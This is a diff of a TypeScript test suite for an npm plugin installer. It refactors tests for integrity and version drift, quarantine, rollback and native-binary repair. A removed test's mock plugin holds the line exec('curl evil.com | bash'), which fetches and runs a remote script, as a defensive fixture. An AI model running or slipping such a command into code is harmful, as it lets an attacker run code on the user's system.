-      const transaction = resolvePluginInstallTransaction(update);
-      expect(transaction).toBeDefined();
-      await transaction?.[settlement]();
-      expect(
-        fs.existsSync(path.join(updateGenerationRoot, "node_modules", "@openclaw", "pack-demo")),
-      ).toBe(settlement === "commit");
-      expect(readTextFileTree(npmProjectRoot)).toEqual(projectBefore);
-    },
-  );
-
-  it.each(["commit", "rollback", "publication failure", "abort during consent"] as const)(
+  it.each(["rollback", "publication failure", "abort during consent"] as const)(
     "settles a same-generation project replacement with %s",
     async (settlement) => {
-      const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
       const packageName = "same-generation-plugin";
       const install = (version: string) =>
         installPluginFromNpmSpec({
           spec: `${packageName}@${version}`,
-          npmDir: npmRoot,
           mode: "update",
         });
       let targetDir = "";
       for (const version of ["1.0.0", "2.0.0"]) {
         mockNpmViewAndInstall({ spec: `${packageName}@${version}`, packageName, version, npmRoot });
         const installed = await install(version);
-        expect(installed.ok).toBe(true);
-        if (!installed.ok) {
-          return;
-        }
+        assert(installed.ok, JSON.stringify(installed));
         targetDir = installed.targetDir;
       }
       const projectRoot = path.dirname(path.dirname(targetDir));
@@ -1085,14 +677,12 @@ describe("installPluginFromNpmSpec", () => {
         managedPeerDependencies: ["original-peer"],
         managedOverrides: ["existing-override"],
       };
-      fs.writeFileSync(manifestPath, JSON.stringify(manifest));
+      writeJson(manifestPath, manifest);
       fs.writeFileSync(path.join(projectRoot, "original.txt"), "original bytes");
       const original = readTextFileTree(projectRoot);
       mockNpmViewAndInstall({
         spec: `${packageName}@2.0.0`,
-        packageName,
         version: "2.0.0",
-        npmRoot,
         indexJs: "export const replacement = true;\n",
       });
       const controller = new AbortController();
@@ -1111,7 +701,6 @@ describe("installPluginFromNpmSpec", () => {
         updated = await installPluginFromNpmSpec(
           requestDeferredPluginInstall({
             spec: `${packageName}@2.0.0`,
-            npmDir: npmRoot,
             mode: "update" as const,
             signal: controller.signal,
             onBeforePluginArtifactCommit: async (artifact: PluginInstallArtifactConsentRequest) => {
@@ -1143,86 +732,19 @@ describe("installPluginFromNpmSpec", () => {
         expect(fs.existsSync(stageRoot)).toBe(false);
         return;
       }
-      expect(updated.ok).toBe(true);
-      if (!updated.ok) {
-        return;
-      }
+      assert(updated.ok, JSON.stringify(updated));
       expect(updated.targetDir).toBe(targetDir);
       expect(fs.readFileSync(path.join(targetDir, "dist", "index.js"), "utf8")).toContain(
         "replacement",
       );
       const transaction = resolvePluginInstallTransaction(updated);
       expect(transaction).toBeDefined();
-      await transaction?.[settlement]();
-      if (settlement === "rollback") {
-        expect(readTextFileTree(projectRoot)).toEqual(original);
-      } else {
-        expect(fs.readFileSync(path.join(targetDir, "dist", "index.js"), "utf8")).toContain(
-          "replacement",
-        );
-      }
+      await transaction?.rollback();
+      expect(readTextFileTree(projectRoot)).toEqual(original);
     },
   );
 
-  it("installs staged npm pack archives with dangerous-looking code", async () => {
-    const stateDir = suiteTempRootTracker.makeTempDir();
-    const npmRoot = path.join(stateDir, "npm");
-    const packageName = "@openclaw/pack-demo";
-    const archivePath = path.join(stateDir, "openclaw-pack-demo-2.0.0.tgz");
-    fs.writeFileSync(archivePath, "v2 pack contents", "utf8");
-
-    mockNpmViewAndInstallMany([
-      {
-        packageName,
-        version: "2.0.0",
-        pluginId: "pack-demo",
-        npmRoot,
-        integrity: "sha512-pack-demo-v2",
-        shasum: "packdemoshav2",
-        packArchivePath: archivePath,
-        indexJs: `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
-      },
-    ]);
-
-    const install = await installPluginFromNpmPackArchive({
-      archivePath,
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: () => {} },
-    });
-
-    expect(install.ok).toBe(true);
-    if (!install.ok) {
-      return;
-    }
-    const npmProjectRoot = resolvePluginNpmProjectDir({
-      npmDir: npmRoot,
-      packageName,
-    });
-    expect(fs.existsSync(path.join(npmProjectRoot, "package.json"))).toBe(true);
-    expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(true);
-  });
-
-  it("installs npm plugins into .openclaw/npm", async () => {
-    const { calls, dependencyInstalled, npmRoot, result } = npmSpecInstallCase;
-
-    expect(result.ok).toBe(true);
-    if (!result.ok) {
-      return;
-    }
-    expect(result.pluginId).toBe("voice-call");
-    expect(result.targetDir).toBe(resolveTestPluginPackageDir(npmRoot, "@openclaw/voice-call"));
-    expect(result.npmResolution?.resolvedSpec).toBe("@openclaw/voice-call@0.0.1");
-    expect(result.npmResolution?.integrity).toBe("sha512-plugin-test");
-    expect(dependencyInstalled).toBe(true);
-    expectNpmInstallIntoProject({
-      calls,
-      npmRoot,
-      packageName: "@openclaw/voice-call",
-    });
-  });
-
   it("runs managed npm installs with the bundled npm CLI under Bun", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
     const npmCliPath = path.join(
       path.dirname(createRequire(import.meta.url).resolve("npm/package.json")),
       "bin/npm-cli.js",
@@ -1230,18 +752,9 @@ describe("installPluginFromNpmSpec", () => {
     const execPath = process.execPath;
     mockNpmViewAndInstall({
       spec: "@openclaw/voice-call@0.0.1",
-      packageName: "@openclaw/voice-call",
       version: "0.0.1",
       pluginId: "voice-call",
-      npmRoot,
     });
-    const mockNpmCommand = runCommandWithTimeoutMock.getMockImplementation()!;
-    runCommandWithTimeoutMock.mockImplementation((argv: string[], options: unknown) =>
-      mockNpmCommand(
-        argv[0] === execPath && argv[1] === npmCliPath ? ["npm", ...argv.slice(2)] : argv,
-        options,
-      ),
-    );
     vi.stubGlobal("process", {
       ...process,
       versions: { ...process.versions, bun: "1.4.2" },
@@ -1249,8 +762,6 @@ describe("installPluginFromNpmSpec", () => {
     try {
       const result = await installPluginFromNpmSpec({
         spec: "@openclaw/voice-call@0.0.1",
-        npmDir: npmRoot,
-        logger: { info: () => {}, warn: () => {} },
       });
       expect(result.ok).toBe(true);
       expect(runCommandWithTimeoutMock).toHaveBeenCalledWith(
@@ -1273,114 +784,18 @@ describe("installPluginFromNpmSpec", () => {
     }
   });
 
-  it("keeps lazy imports from a loaded old npm generation available across updates", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
-    const packageName = "@openclaw/codex";
-    mockNpmViewAndInstall({
-      spec: `${packageName}@1.0.0`,
-      packageName,
-      version: "1.0.0",
-      pluginId: "codex",
-      npmRoot,
-      integrity: "sha512-codex-v1",
-      shasum: "codexv1sha",
-      indexJs: `module.exports = {
-  version: "v1",
-  runAttempt: async () => (await import("./run-attempt-old.js")).default,
-};\n`,
-      extraDistFiles: {
-        "run-attempt-old.js": "module.exports = { chunk: 'old' };\n",
-      },
-      expectedDependencySpec: "1.0.0",
-    });
-
-    const first = await installPluginFromNpmSpec({
-      spec: `${packageName}@1.0.0`,
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: () => {} },
-    });
-
-    expect(first.ok).toBe(true);
-    if (!first.ok) {
-      return;
-    }
-    const firstEntry = path.join(first.targetDir, "dist", "index.js");
-    expect(first.targetDir).toBe(resolveTestPluginPackageDir(npmRoot, packageName));
-    const oldModule = await import(pathToFileURL(firstEntry).href);
-    expect(oldModule.default.version).toBe("v1");
-
-    mockNpmViewAndInstall({
-      spec: `${packageName}@2.0.0`,
-      packageName,
-      version: "2.0.0",
-      pluginId: "codex",
-      npmRoot,
-      integrity: "sha512-codex-v2",
-      shasum: "codexv2sha",
-      indexJs: `module.exports = {
-  version: "v2",
-  runAttempt: async () => (await import("./run-attempt-new.js")).default,
-};\n`,
-      extraDistFiles: {
-        "run-attempt-new.js": "module.exports = { chunk: 'new' };\n",
-      },
-      replaceExisting: true,
-      expectedDependencySpec: "2.0.0",
-    });
-
-    const update = await installPluginFromNpmSpec({
-      spec: `${packageName}@2.0.0`,
-      npmDir: npmRoot,
-      mode: "update",
-      logger: { info: () => {}, warn: () => {} },
-    });
-
-    expect(update.ok).toBe(true);
-    if (!update.ok) {
-      return;
-    }
-    const updateGenerationRoot = resolvePluginNpmGenerationProjectDir({
-      npmDir: npmRoot,
-      packageName,
-      generationKey: [
-        packageName,
-        "2.0.0",
-        `${packageName}@2.0.0`,
-        "sha512-codex-v2",
-        "codexv2sha",
-      ].join("\n"),
-    });
-    expect(update.targetDir).toBe(
-      path.join(updateGenerationRoot, "node_modules", ...packageName.split("/")),
-    );
-    expect(update.targetDir).not.toBe(first.targetDir);
-    expect(fs.existsSync(path.join(first.targetDir, "dist", "run-attempt-old.js"))).toBe(true);
-    expect(fs.existsSync(path.join(update.targetDir, "dist", "run-attempt-new.js"))).toBe(true);
-
-    await expect(oldModule.default.runAttempt()).resolves.toEqual({ chunk: "old" });
-    const newModule = await import(
-      pathToFileURL(path.join(update.targetDir, "dist", "index.js")).href
-    );
-    await expect(newModule.default.runAttempt()).resolves.toEqual({ chunk: "new" });
-  });
-
   it("does not mutate a retained generation when an exact rollback reuses its artifact key", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
     const packageName = "@openclaw/codex";
     const install = async (version: string, options: { mode?: "update" }) =>
       installPluginFromNpmSpec({
         spec: `${packageName}@${version}`,
-        npmDir: npmRoot,
         mode: options.mode,
-        logger: { info: () => {}, warn: () => {} },
       });
 
     mockNpmViewAndInstall({
       spec: `${packageName}@2.0.0`,
-      packageName,
       version: "2.0.0",
       pluginId: "codex",
-      npmRoot,
       integrity: "sha512-codex-v2",
       shasum: "codexv2sha",
       indexJs: `module.exports = {
@@ -1393,10 +808,7 @@ describe("installPluginFromNpmSpec", () => {
       expectedDependencySpec: "2.0.0",
     });
     const first = await install("2.0.0", {});
-    expect(first.ok).toBe(true);
-    if (!first.ok) {
-      return;
-    }
+    assert(first.ok, JSON.stringify(first));
     const retainedModule = await import(
       pathToFileURL(path.join(first.targetDir, "dist", "index.js")).href
     );
@@ -1404,10 +816,8 @@ describe("installPluginFromNpmSpec", () => {
 
     mockNpmViewAndInstall({
       spec: `${packageName}@3.0.0`,
-      packageName,
       version: "3.0.0",
       pluginId: "codex",
-      npmRoot,
       integrity: "sha512-codex-v3",
       shasum: "codexv3sha",
       indexJs: "module.exports = { version: 'v3' };\n",
@@ -1415,10 +825,7 @@ describe("installPluginFromNpmSpec", () => {
       expectedDependencySpec: "3.0.0",
     });
     const update = await install("3.0.0", { mode: "update" });
-    expect(update.ok).toBe(true);
-    if (!update.ok) {
-      return;
-    }
+    assert(update.ok, JSON.stringify(update));
     await markRetainedManagedNpmInstall({
       packageDir: retainedPackageDir,
       pluginId: "codex",
@@ -1427,10 +834,8 @@ describe("installPluginFromNpmSpec", () => {
 
     mockNpmViewAndInstall({
       spec: `${packageName}@2.0.0`,
-      packageName,
       version: "2.0.0",
       pluginId: "codex",
-      npmRoot,
       integrity: "sha512-codex-v2",
       shasum: "codexv2sha",
       indexJs: "module.exports = { version: 'v2-rollback' };\n",
@@ -1438,62 +843,13 @@ describe("installPluginFromNpmSpec", () => {
       expectedDependencySpec: "2.0.0",
     });
     const rollback = await install("2.0.0", { mode: "update" });
-    expect(rollback.ok).toBe(true);
-    if (!rollback.ok) {
-      return;
-    }
+    assert(rollback.ok, JSON.stringify(rollback));
     expect(rollback.targetDir).not.toBe(retainedPackageDir);
     await expect(retainedModule.default.runAttempt()).resolves.toEqual({ chunk: "v2" });
     expect(fs.existsSync(path.join(retainedPackageDir, "dist", "run-attempt-v2.js"))).toBe(true);
   });
 
-  it("installs into a fresh generation when the legacy npm target is retained", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
-    const packageName = "@openclaw/codex";
-    const legacyPackageDir = resolveTestPluginPackageDir(npmRoot, packageName);
-    fs.mkdirSync(legacyPackageDir, { recursive: true });
-    await markRetainedManagedNpmInstall({
-      packageDir: legacyPackageDir,
-      pluginId: "codex",
-      retainedAt: "2026-04-25T00:00:00.000Z",
-      reason: "replaced-by-managed-npm-generation-update",
-    });
-    mockNpmViewAndInstall({
-      spec: `${packageName}@2.0.0`,
-      packageName,
-      version: "2.0.0",
-      pluginId: "codex",
-      npmRoot,
-      integrity: "sha512-codex-v2",
-      shasum: "codexv2sha",
-      expectedDependencySpec: "2.0.0",
-    });
-
-    const result = await installPluginFromNpmSpec({
-      spec: `${packageName}@2.0.0`,
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: () => {} },
-    });
-
-    expect(result.ok).toBe(true);
-    if (!result.ok) {
-      return;
-    }
-    expect(result.targetDir).toBe(
-      resolveTestPluginGenerationPackageDir({
-        npmRoot,
-        packageName,
-        version: "2.0.0",
-        integrity: "sha512-codex-v2",
-        shasum: "codexv2sha",
-      }),
-    );
-    expect(result.targetDir).not.toBe(legacyPackageDir);
-    expect(fs.existsSync(legacyPackageDir)).toBe(true);
-  });
-
   it("allocates a fresh generation when a plain install selects a retained artifact", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
     const packageName = "@openclaw/codex";
     const legacyPackageDir = resolveTestPluginPackageDir(npmRoot, packageName);
     const retainedGenerationPackageDir = resolveTestPluginGenerationPackageDir({
@@ -1515,10 +871,8 @@ describe("installPluginFromNpmSpec", () => {
     }
     mockNpmViewAndInstall({
       spec: `${packageName}@2.0.0`,
-      packageName,
       version: "2.0.0",
       pluginId: "codex",
-      npmRoot,
       integrity: "sha512-codex-v2",
       shasum: "codexv2sha",
       expectedDependencySpec: "2.0.0",
@@ -1526,258 +880,97 @@ describe("installPluginFromNpmSpec", () => {
 
     const result = await installPluginFromNpmSpec({
       spec: `${packageName}@2.0.0`,
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: () => {} },
     });
 
-    expect(result.ok).toBe(true);
-    if (!result.ok) {
-      return;
-    }
+    assert(result.ok, JSON.stringify(result));
     expect(result.targetDir).not.toBe(retainedGenerationPackageDir);
     expect(hasRetainedManagedNpmInstallMarker(result.targetDir)).toBe(false);
     expect(hasRetainedManagedNpmInstallMarker(retainedGenerationPackageDir)).toBe(true);
     expect(hasRetainedManagedNpmInstallMarker(legacyPackageDir)).toBe(true);
   });
 
-  it("rejects npm installs when the installed artifact drifts from verified metadata", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
-    const npmProjectRoot = resolvePluginNpmProjectDir({
-      npmDir: npmRoot,
-      packageName: "drift-plugin",
-    });
-    mockNpmViewAndInstall({
-      spec: "drift-plugin@latest",
-      packageName: "drift-plugin",
-      version: "1.0.0",
-      pluginId: "drift-plugin",
-      integrity: "sha512-safe",
-      installedVersion: "1.0.0",
-      installedIntegrity: "sha512-evil",
-      npmRoot,
-      expectedDependencySpec: "1.0.0",
-    });
-    const delegate = runCommandWithTimeoutMock.getMockImplementation();
-    if (!delegate) {
-      throw new Error("expected npm mock implementation");
-    }
-    let managedInstallAttempts = 0;
-    runCommandWithTimeoutMock.mockImplementation(async (argv, options) => {
-      if (
-        isManagedNpmInstallCommand(argv) &&
-        typeof options?.cwd === "string" &&
-        managedNpmRootHasDependency(options.cwd, "drift-plugin")
-      ) {
-        managedInstallAttempts += 1;
-      }
-      return await delegate(argv, options);
-    });
-
-    const result = await installPluginFromNpmSpec({
-      spec: "drift-plugin@latest",
+  const metadataFailures: Array<{
+    label: string;
+    fixture: Partial<MockNpmPackage>;
+    errors: string[];
+    attempts: number;
+    expectedIntegrity?: string;
+  }> = [
+    {
+      label: "integrity drift",
+      fixture: { integrity: "sha512-safe", installedIntegrity: "sha512-evil" },
+      errors: ["integrity sha512-evil", "expected sha512-safe"],
+      attempts: 1,
       expectedIntegrity: "sha512-safe",
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: () => {} },
-    });
-
-    expect(result.ok).toBe(false);
-    if (result.ok) {
-      return;
-    }
-    expect(result.error).toContain("integrity sha512-evil");
-    expect(result.error).toContain("expected sha512-safe");
-    expect(managedInstallAttempts).toBe(1);
-    expect(
-      fs.existsSync(path.join(path.dirname(npmProjectRoot), "_openclaw-quarantined-npm-projects")),
-    ).toBe(false);
-    expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, "drift-plugin"))).toBe(false);
-  });
-
-  it("rejects a trusted pin when registry metadata omits integrity before install", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
-    const packageName = "missing-registry-integrity-plugin";
-    mockNpmViewAndInstall({
-      spec: `${packageName}@latest`,
-      packageName,
-      version: "1.0.0",
-      pluginId: packageName,
-      integrity: "sha512-substituted",
-      shasum: "substituted-shasum",
-      omitViewIntegrity: true,
-      npmRoot,
-      expectedDependencySpec: "1.0.0",
-    });
-
-    const result = await installPluginFromNpmSpec({
-      spec: `${packageName}@latest`,
-      expectedIntegrity: "sha512-trusted",
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: () => {} },
-    });
-
-    expect(result).toEqual({
-      ok: false,
-      error: `aborted: npm package integrity missing for ${packageName}@1.0.0`,
-    });
-    expect(
-      runCommandWithTimeoutMock.mock.calls.some(([argv]) => isManagedNpmInstallCommand(argv)),
-    ).toBe(false);
-    expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(false);
-  });
-
-  it("rejects npm installs when the installed version drifts from verified metadata", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
-    const npmProjectRoot = resolvePluginNpmProjectDir({
-      npmDir: npmRoot,
-      packageName: "version-drift-plugin",
-    });
-    mockNpmViewAndInstall({
-      spec: "version-drift-plugin@latest",
-      packageName: "version-drift-plugin",
-      version: "1.0.0",
-      pluginId: "version-drift-plugin",
-      installedVersion: "1.0.1",
-      npmRoot,
-      expectedDependencySpec: "1.0.0",
-    });
-    const delegate = runCommandWithTimeoutMock.getMockImplementation();
-    if (!delegate) {
-      throw new Error("expected npm mock implementation");
-    }
-    let managedInstallAttempts = 0;
-    runCommandWithTimeoutMock.mockImplementation(async (argv, options) => {
-      if (isManagedNpmInstallCommand(argv) && typeof options?.cwd === "string") {
-        managedInstallAttempts += 1;
-      }
-      return await delegate(argv, options);
-    });
-
-    const result = await installPluginFromNpmSpec({
-      spec: "version-drift-plugin@latest",
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: () => {} },
-    });
-
-    expect(result.ok).toBe(false);
-    if (result.ok) {
-      return;
-    }
-    expect(result.error).toContain("version 1.0.1");
-    expect(result.error).toContain("expected 1.0.0");
-    expect(managedInstallAttempts).toBe(1);
-    expect(
-      fs.existsSync(path.join(path.dirname(npmProjectRoot), "_openclaw-quarantined-npm-projects")),
-    ).toBe(false);
-    expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, "version-drift-plugin"))).toBe(false);
-  });
-
-  it("quarantines incomplete integrity metadata and rebuilds the managed project once", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
-    const packageName = "missing-integrity-plugin";
-    const npmProjectRoot = resolvePluginNpmProjectDir({ npmDir: npmRoot, packageName });
-    const fixture: MockNpmPackage & { spec: string } = {
-      spec: `${packageName}@latest`,
-      packageName,
-      version: "1.0.0",
-      pluginId: packageName,
-      integrity: "sha512-safe",
-      omitInstalledIntegrity: true,
-      npmRoot,
-      expectedDependencySpec: "1.0.0",
-    };
-    mockNpmViewAndInstall(fixture);
-    const delegate = runCommandWithTimeoutMock.getMockImplementation();
-    if (!delegate) {
-      throw new Error("expected npm mock implementation");
-    }
-    const warnings: string[] = [];
-    let managedInstallAttempts = 0;
-    runCommandWithTimeoutMock.mockImplementation(async (argv, options) => {
-      if (
-        isManagedNpmInstallCommand(argv) &&
-        typeof options?.cwd === "string" &&
-        managedNpmRootHasDependency(options.cwd, packageName)
-      ) {
-        managedInstallAttempts += 1;
-        if (managedInstallAttempts === 2) {
-          fixture.omitInstalledIntegrity = false;
-        }
-      }
-      return await delegate(argv, options);
-    });
-
-    const result = await installPluginFromNpmSpec({
-      spec: fixture.spec,
-      expectedIntegrity: fixture.integrity,
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: (message) => warnings.push(message) },
-    });
-
-    expect(result.ok).toBe(true);
-    expect(managedInstallAttempts).toBe(2);
-    expect(warnings.some((warning) => warning.includes("integrity missing"))).toBe(true);
-    const installed = JSON.parse(
-      fs.readFileSync(path.join(npmProjectRoot, "package-lock.json"), "utf8"),
-    ) as { packages?: Record<string, { integrity?: string }> };
-    expect(installed.packages?.[`node_modules/${packageName}`]?.integrity).toBe("sha512-safe");
-    expectManagedNpmQuarantine(warnings);
-  });
-
-  it.each(["integrity", "version"] as const)(
-    "fails closed when rebuilt package-lock metadata still omits %s",
-    async (missingField) => {
-      const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
-      const packageName = "persistently-incomplete-metadata-plugin";
+    },
+    {
+      label: "version drift",
+      fixture: { installedVersion: "1.0.1" },
+      errors: ["version 1.0.1", "expected 1.0.0"],
+      attempts: 1,
+    },
+    {
+      label: "missing integrity",
+      fixture: { integrity: "sha512-safe", omitInstalledIntegrity: true },
+      errors: [
+        "metadata remained incomplete after managed npm project recovery",
+        "integrity missing",
+      ],
+      attempts: 2,
+      expectedIntegrity: "sha512-safe",
+    },
+    {
+      label: "missing version",
+      fixture: { integrity: "sha512-safe", omitInstalledVersion: true },
+      errors: [
+        "metadata remained incomplete after managed npm project recovery",
+        "version missing",
+      ],
+      attempts: 2,
+      expectedIntegrity: "sha512-safe",
+    },
+    {
+      label: "missing lock entry",
+      fixture: { skipLockfileEntry: true },
+      errors: ["npm install did not record package-lock metadata for metadata-plugin"],
+      attempts: 2,
+    },
+  ];
+  it.each(metadataFailures)(
+    "rejects $label without publishing the plugin",
+    async ({ fixture, errors, attempts, expectedIntegrity }) => {
+      const packageName = "metadata-plugin";
+      const npmProjectRoot = resolvePluginNpmProjectDir({ npmDir: npmRoot, packageName });
       mockNpmViewAndInstall({
         spec: `${packageName}@latest`,
-        packageName,
-        version: "1.0.0",
-        pluginId: packageName,
-        integrity: "sha512-safe",
-        omitInstalledIntegrity: missingField === "integrity",
-        omitInstalledVersion: missingField === "version",
-        npmRoot,
         expectedDependencySpec: "1.0.0",
+        ...fixture,
       });
-      const delegate = runCommandWithTimeoutMock.getMockImplementation();
-      if (!delegate) {
-        throw new Error("expected npm mock implementation");
-      }
-      let managedInstallAttempts = 0;
-      runCommandWithTimeoutMock.mockImplementation(async (argv, options) => {
-        if (
-          isManagedNpmInstallCommand(argv) &&
-          typeof options?.cwd === "string" &&
-          managedNpmRootHasDependency(options.cwd, packageName)
-        ) {
-          managedInstallAttempts += 1;
-        }
-        return await delegate(argv, options);
-      });
-
       const result = await installPluginFromNpmSpec({
         spec: `${packageName}@latest`,
-        expectedIntegrity: "sha512-safe",
-        npmDir: npmRoot,
-        logger: { info: () => {}, warn: () => {} },
+        expectedIntegrity,
       });
-
-      expect(result.ok).toBe(false);
-      if (result.ok) {
-        return;
+      assert(!result.ok, JSON.stringify(result));
+      for (const error of errors) {
+        expect(result.error).toContain(error);
       }
-      expect(managedInstallAttempts).toBe(2);
-      expect(result.error).toContain(
-        "metadata remained incomplete after managed npm project recovery",
-      );
-      expect(result.error).toContain(`${missingField} missing`);
-      expectManagedNpmQuarantine([result.error]);
+      expect(
+        runCommandWithTimeoutMock.mock.calls.filter(([argv]) => isManagedNpmInstallCommand(argv)),
+      ).toHaveLength(attempts);
+      if (attempts === 2) {
+        expectManagedNpmQuarantine([result.error]);
+      } else {
+        expect(
+          fs.existsSync(
+            path.join(path.dirname(npmProjectRoot), "_openclaw-quarantined-npm-projects"),
+          ),
+        ).toBe(false);
+      }
       expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(false);
     },
   );
 
   it("preserves the original project and staged quarantine when post-recovery validation fails", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
     const packageName = "unsafe-recovered-plugin";
     const addedPeerName = "recovery-added-peer";
     const npmProjectRoot = resolvePluginNpmProjectDir({ npmDir: npmRoot, packageName });
@@ -1853,14 +1046,13 @@ describe("installPluginFromNpmSpec", () => {
       manifest.dependencies[addedPeerName] = "2.0.0";
       manifest.openclaw ??= {};
       manifest.openclaw.managedPeerDependencies = [addedPeerName];
-      fs.writeFileSync(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`, "utf8");
+      writeJson(manifestPath, manifest);
       mutatedPeerAfterQuarantine = true;
     };
 
     const result = await installPluginFromNpmSpec({
       spec: fixture.spec,
       expectedIntegrity: fixture.integrity,
-      npmDir: npmRoot,
       logger: {
         info: () => {},
         warn: (message) => {
@@ -1872,10 +1064,7 @@ describe("installPluginFromNpmSpec", () => {
       },
     });
 
-    expect(result.ok).toBe(false);
-    if (result.ok) {
-      return;
-    }
+    assert(!result.ok, JSON.stringify(result));
     expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.SECURITY_SCAN_FAILED);
     expect(result.error).toContain("installed dependency scan found package outside install root");
     expect(managedInstallAttempts).toBe(2);
@@ -1891,174 +1080,106 @@ describe("installPluginFromNpmSpec", () => {
     expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, packageName))).toBe(false);
   });
 
-  it("quarantines and retries once when package-lock omits the installed plugin", async () => {
-    const npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
+  it("repairs a missing current-platform executable with a fresh npm cache", async () => {
+    const packageName = "@openclaw/codex-fixture";
+    const platformPackage = "@vendor/codex-platform";
+    const canonicalPackage = "@vendor/codex";
+    const platformPackageLocation = path.posix.join(
+      "node_modules",
+      packageName,
+      "node_modules",
+      platformPackage,
+    );
+    const warnings: string[] = [];
     mockNpmViewAndInstall({
-      spec: "missing-lock-plugin@latest",
-      packageName: "missing-lock-plugin",
-      version: "1.0.0",
-      pluginId: "missing-lock-plugin",
-      npmRoot,
+      spec: `${packageName}@1.0.0`,
+      pluginId: "codex-fixture",
       expectedDependencySpec: "1.0.0",
-      skipLockfileEntry: true,
+      openclaw: {
+        extensions: ["./dist/index.js"],
+        install: { requiredPlatformPackages: [platformPackage] },
+      },
     });
     const delegate = runCommandWithTimeoutMock.getMockImplementation();
     if (!delegate) {
       throw new Error("expected npm mock implementation");
     }
     let managedInstallAttempts = 0;
-    runCommandWithTimeoutMock.mockImplementation(async (argv, options) => {
-      if (
-        isManagedNpmInstallCommand(argv) &&
-        typeof options?.cwd === "string" &&
-        managedNpmRootHasDependency(options.cwd, "missing-lock-plugin")
-      ) {
-        managedInstallAttempts += 1;
-      }
-      return await delegate(argv, options);
-    });
+    let repairCacheDir = "";
+    let removedIncompletePackageBeforeRepair = false;
+    runCommandWithTimeoutMock.mockImplementation(
+      async (argv: string[], options?: { cwd?: string; env?: NodeJS.ProcessEnv }) => {
+        const attemptRoot = options?.cwd;
+        const installEnv = options?.env;
+        const isTargetInstall = isManagedNpmInstallCommand(argv) && typeof attemptRoot === "string";
+        const packageDir = path.join(attemptRoot ?? "", ...platformPackageLocation.split("/"));
+        if (isTargetInstall && managedInstallAttempts === 1) {
+          removedIncompletePackageBeforeRepair = !fs.existsSync(packageDir);
+        }
+        const result = await delegate(argv, options);
+        if (isTargetInstall) {
+          managedInstallAttempts += 1;
+          writeMissingCurrentPlatformOptionalPackage({
+            npmRoot: attemptRoot,
+            packageName: platformPackage,
+            packageLocation: platformPackageLocation,
+          });
+          const lockPath = path.join(attemptRoot, "package-lock.json");
+          const lockfile = JSON.parse(fs.readFileSync(lockPath, "utf8")) as {
+            packages: Record<string, unknown>;
+          };
+          lockfile.packages[`node_modules/${canonicalPackage}`] = {
+            bin: { codex: "bin/codex.js" },
+          };
+          writeJson(lockPath, lockfile);
+          if (managedInstallAttempts === 1) {
+            fs.mkdirSync(packageDir, { recursive: true });
+
+            writeJson(path.join(packageDir, "package.json"), {
+              name: canonicalPackage,
+              version: "1.0.0-platform",
+              files: ["vendor"],
+            });
+            const nativeBinDir = path.join(packageDir, "vendor", "current-platform", "bin");
+            fs.mkdirSync(nativeBinDir, { recursive: true });
+            fs.writeFileSync(path.join(nativeBinDir, "codex-helper"), "helper", "utf8");
+          } else {
+            repairCacheDir = installEnv?.npm_config_cache ?? "";
+            fs.mkdirSync(packageDir, { recursive: true });
+            writeJson(path.join(packageDir, "package.json"), {
+              name: canonicalPackage,
+              version: "1.0.0-platform",
+              files: ["vendor"],
+            });
+            const nativeBinDir = path.join(packageDir, "vendor", "current-platform", "bin");
+            fs.mkdirSync(nativeBinDir, { recursive: true });
+            const executableName = process.platform === "win32" ? "codex.exe" : "codex";
+            fs.writeFileSync(path.join(nativeBinDir, executableName), "native executable", {
+              encoding: "utf8",
+              mode: 0o755,
+            });
+          }
+        }
+        return result;
+      },
+    );
 
     const result = await installPluginFromNpmSpec({
-      spec: "missing-lock-plugin@latest",
-      npmDir: npmRoot,
-      logger: { info: () => {}, warn: () => {} },
+      spec: `${packageName}@1.0.0`,
+      logger: { info: () => {}, warn: (message) => warnings.push(message) },
     });
 
-    expect(result.ok).toBe(false);
-    if (result.ok) {
-      return;
-    }
-    expect(result.error).toContain(
-      "npm install did not record package-lock metadata for missing-lock-plugin",
-    );
+    expect(result.ok).toBe(true);
     expect(managedInstallAttempts).toBe(2);
-    expectManagedNpmQuarantine([result.error]);
-    expect(fs.existsSync(resolveTestPluginPackageDir(npmRoot, "missing-lock-plugin"))).toBe(false);
+    expect(removedIncompletePackageBeforeRepair).toBe(true);
+    expect(repairCacheDir).toContain("openclaw-npm-cache-");
+    expect(fs.existsSync(repairCacheDir)).toBe(false);
+    expect(warnings).toContain(
+      `npm left current-platform package(s) ${platformPackage} missing or incomplete; retrying once with a fresh cache.`,
+    );
   });
 
-  it.each(["omitted", "missing package manifest", "missing native executable"])(
-    "repairs a current-platform package that is %s with a fresh npm cache",
-    async (initialPackageState) => {
-      const stateDir = suiteTempRootTracker.makeTempDir();
